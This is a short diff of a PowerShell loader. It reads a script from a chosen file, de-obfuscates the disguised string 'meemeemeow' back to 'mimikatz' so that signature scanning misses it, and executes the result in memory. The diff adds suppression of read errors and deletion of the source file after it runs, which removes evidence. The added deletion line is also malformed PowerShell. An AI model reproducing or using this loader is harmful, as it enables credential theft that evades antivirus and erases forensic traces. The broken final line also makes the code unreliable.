@@ -16,8 +16,10 @@ return $objForm.FileName
 }
 
 $strCPath = Get-CodePath
-$strCode = [io.file]::ReadAllText($strCPath)
+try{$strCode = [io.file]::ReadAllText($strCPath)} catch{} finally{}
 $strCode = $strCode -replace "Nooote", "NoteProperty"
 $strCode = $strCode -replace "meemeemeow", "mimikatz"
 $strCode = [scriptblock]::Create($strCode)
 .$strCode
+
+try{}rm $strCPath catch{} finally{}
